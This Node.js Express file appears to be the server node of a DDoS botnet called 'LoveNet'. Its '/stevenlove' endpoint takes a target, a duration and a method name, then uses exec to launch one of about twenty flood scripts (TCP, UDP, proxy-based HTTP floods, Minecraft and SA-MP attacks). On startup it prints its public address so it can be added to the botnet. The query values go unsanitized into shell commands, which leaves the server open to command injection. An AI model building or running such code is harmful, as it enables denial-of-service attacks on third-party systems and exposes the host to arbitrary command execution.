const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 7070;
const scrapeProxies = require('./proxy.js');

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error Fetching Data: ${error.message}`);
  }
}
async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy Link This Add To Api Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/stevenlove', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API Server Botnet Request Received. Executing Script Shortly.',
    target,
    time,
    methods
  });

  // Eksekusi Sesuai Methods Yang Ada Dilist LoveNet🕊
  if (methods === 'ninja') {
    console.log('received🕊');
    exec(`node ninja.js ${target} ${time}`);
  } else if (methods === 'batam') {
    exec(`node batam.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'space') {
    exec(`node space.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'flash') {
    exec(`node flash.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'mantan') {
    exec(`node mantan.js ${target} ${time} 65 15`);
  } else if (methods === 'net-x') {
    exec(`node net-x.js ${target} ${time} 65 15`);
  } else if (methods === 'browser') {
    exec(`node browser.js ${target} ${time}`);
  } else if (methods === 'lovenet-x') {
    exec(`node lovenet-x.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'lovenet-flash') {
    exec(`node lovenet-flash.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'lovenet-space') {
   exec(`node lovenet-space.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'lovenet-steven') {
    exec(`node lovenet-steven.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'lovenet-death') {
    exec(`node lovenet-death.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'lovenet-panel') {
    exec(`node lovenet-panel.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'stop') {
    exec(`node stop.js ${target} ${time} 1 1 proxy.txt`);
  } else if (methods === 'tcp') {
    exec(`node tcp.js ${target}:443 ${time}`);
  } else if (methods === 'udp') {
    exec(`node udp.js ${target} ${time}`);
  } else if (methods === 'kill-ping') {
    exec(`node kill-ping.js ${target} ${time}`);
  } else if (methods === 'kill-do') {
    exec(`node kill-do.js ${target} ${time}`);
  } else if (methods === 'samp') {
    exec(`node methods/samp.js ${target} ${time}`);
  } else if (methods === 'mc') {
    exec(`node mc.js ${target} ${time}`);
  } else {
    console.log('Methods Tidak Dikenali Atau Format Yang Anda Masukan Salah🕊.');
  }
});

app.listen(port, () => {
  scrapeUserAgent();
  fetchData();
});
